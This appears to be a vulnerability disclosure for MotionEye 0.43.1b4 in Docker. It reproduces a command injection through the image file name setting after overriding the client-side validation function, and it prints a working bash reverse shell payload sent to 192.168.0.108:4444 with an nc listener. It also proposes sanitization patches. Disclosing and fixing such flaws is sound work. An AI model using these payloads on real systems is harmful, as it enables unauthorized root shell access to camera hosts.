# MotionEye RCE via Client-Side Validation Bypass

## Summary
During security testing of a MotionEye instance running in Docker, it was observed that client-side validation within the web UI can be bypassed. This allows arbitrary input to be submitted, including payloads that can trigger execution on the host container. The issue poses a risk of remote code execution (RCE) if exploited.

---

## Environment
- Target: MotionEye running in Docker  
- Image: `ghcr.io/motioneye-project/motioneye:edge`  
- Exposed Port: `9999` mapped to container’s `8765`  
- Test Credentials: `admin` / blank password (default)  

---

## Steps to Reproduce

### 1. Container Setup
```bash
docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
```
<img width="746" height="241" alt="image" src="https://github.com/user-attachments/assets/45a4ce9e-9910-402e-9906-ebaf599f4fd1" />


### 2. Version Verification
```bash
docker logs motioneye | grep "motionEye server"
```
**Result:** MotionEye server `0.43.1b4`
<img width="741" height="168" alt="image" src="https://github.com/user-attachments/assets/1b14e8d4-d6d9-4f0c-8465-5b806eaab83f" />


### 3. File System Access
```bash
docker exec -it motioneye /bin/bash
ls -la /tmp
```
<img width="452" height="128" alt="image" src="https://github.com/user-attachments/assets/fb7f5189-d50d-4c50-ad1e-6bd84622d736" />


### 4. Initial Access
Access web interface at:  
http://127.0.0.1:9999  
Login: `admin` (blank password)

### 5. Camera Setup
Added sample RTSP network camera.  
<img width="1623" height="869" alt="image" src="https://github.com/user-attachments/assets/dcef8d97-062e-408d-bcda-cdd3fd304324" />


### 6. Injection Attempt
```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```
Blocked by client-side validation.
<img width="739" height="104" alt="image" src="https://github.com/user-attachments/assets/0cadf3c1-fa84-4719-9ef8-e60a62ccec6b" />

<img width="611" height="90" alt="image" src="https://github.com/user-attachments/assets/0a2ce196-6513-4246-ae0c-0d2472d0fc89" />



### 7. Client-Side Validation Discovery
File: `/static/js/main.js?v=0.43.1b4` referencing `/static/js/ui.js?v=0.43.1b4`  
```javascript
function configUiValid() {
    $('div.settings').find('.validator').each(function () { this.validate(); });
    var valid = true;
    $('div.settings input, select').each(function () {
        if (this.invalid) { valid = false; return false; }
    });
    return valid;
}
```

### 8. Bypass Technique
```javascript
configUiValid = function() { 
    return true; 
};
```
<img width="819" height="539" alt="image" src="https://github.com/user-attachments/assets/5256c74d-daf4-4595-bd91-69989f43c5c3" />


### 9. Payload Execution
Settings:  
- Capture mode = Interval Snapshots  
- Interval = 10  
- Image File Name:  
```bash
$(touch /tmp/test).%Y-%m-%d-%H-%M-%S
```
<img width="565" height="344" alt="image" src="https://github.com/user-attachments/assets/22a7495d-b5e6-4d7a-8cc2-9f0375c17015" />

Applied → File created with **root permissions**.  

<img width="554" height="164" alt="image" src="https://github.com/user-attachments/assets/70b2363f-fa1e-47d6-9d39-bdf4693c6929" />


---

## Impact: Weaponizing RCE

Listener:
```bash
nc -lvnp 4444
```
<img width="303" height="110" alt="image" src="https://github.com/user-attachments/assets/c418d646-52bc-4349-b291-1162f978233c" />


Injected Payload:
```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/192.168.0.108/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/54ffbcc1-799f-4833-9470-edba112510e5" />


Result: Remote shell obtained.  
[IMAGE PLACEHOLDER]

---

## Root Cause & Flow
Unsanitized input written into Motion config files:  
`Dashboard JS → ConfigHandler.set_config() → camera-1.conf → motionctl.restart() → motion parses picture_filename → executes payload`

---

## Prevention

### Sanitization Fix
File: `/usr/local/lib/python3.13/dist-packages/motioneye/config.py`
```python
def sanitize_filename(value):
    # allow only letters, numbers, %, _, -, /, .
    for ch in value:
        if not (ch.isalnum() or ch in "%-_/."):
            return "%Y-%m-%d/%H-%M-%S"  # safe fallback
    return value
```
<img width="1109" height="504" alt="image" src="https://github.com/user-attachments/assets/79c3f51b-0523-4199-b4b5-8a265d7fc0d8" />


Apply sanitization:
```python
data['picture_filename']  = sanitize_filename(ui['image_file_name'])
data['snapshot_filename'] = sanitize_filename(ui['image_file_name'])
```
before:
<img width="1126" height="471" alt="image" src="https://github.com/user-attachments/assets/1ea2d7e3-5988-4093-86ac-5abb5870ebd5" />
after:
<img width="974" height="471" alt="image" src="https://github.com/user-attachments/assets/44e474eb-e4ec-4787-b023-9e3aa104edb2" />

---

## Alternative Resolution

### Step 1: Run Docker
```bash
docker run -d --name motioneye -p 9999:8765 ghcr.io/motioneye-project/motioneye:edge
```

### Step 2: Access Container
```bash
docker exec -it motioneye /bin/bash
docker cp motioneye:/usr/local/lib/python3.13/dist-packages/motioneye/config.py ./config.py
docker cp ./Mconfig.py motioneye:/usr/local/lib/python3.13/dist-packages/motioneye/config.py
```

### Step 3: Modify Config
Original:
```python
on_event_start = [f"{meyectl.find_command('relayevent')} start %t"]
on_event_end = [f"{meyectl.find_command('relayevent')} stop %t"]
on_movie_end = [f"{meyectl.find_command('relayevent')} movie_end %t %f"]
on_picture_save = [f"{meyectl.find_command('relayevent')} picture_save %t %f"]
```

Replace with:
```python
import re

on_event_start  = [f"{meyectl.find_command('relayevent')} start '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}'"]
on_event_end    = [f"{meyectl.find_command('relayevent')} stop '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}'"]
on_movie_end    = [f"{meyectl.find_command('relayevent')} movie_end '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}' '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%f')}'"]
on_picture_save = [f"{meyectl.find_command('relayevent')} picture_save '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%t')}' '{re.sub(r'[;&|$`()<>\"\\' ]', '', '%f')}'"]
```
<img width="1060" height="116" alt="image" src="https://github.com/user-attachments/assets/fa695680-d157-4ad1-8db2-f2f4fa641c05" />

### Step 4: Restart
```bash
docker restart motioneye
```
<img width="539" height="95" alt="image" src="https://github.com/user-attachments/assets/43477fa4-f5b1-4460-b0b4-0f4eebb8f39d" />

---

## Alternative Patch
Inside `motion_camera_ui_to_dict(...)`:

Original:
```python
data['picture_filename'] = ui['image_file_name']
data['snapshot_filename'] = ui['image_file_name']
```

Replace with:
```python
from re import sub
data['picture_filename']  = (sub(r'[^A-Za-z0-9._%/-]', '_', ui['image_file_name']).lstrip('/') or '%Y-%m-%d/%H-%M-%S')
data['snapshot_filename'] = (sub(r'[^A-Za-z0-9._%/-]', '_', ui['image_file_name']).lstrip('/') or '%Y-%m-%d/%H-%M-%S')
```

---

## Additional Notes
- Movie File Name also takes unsanitized input (not RCE in testing, but should be patched).  

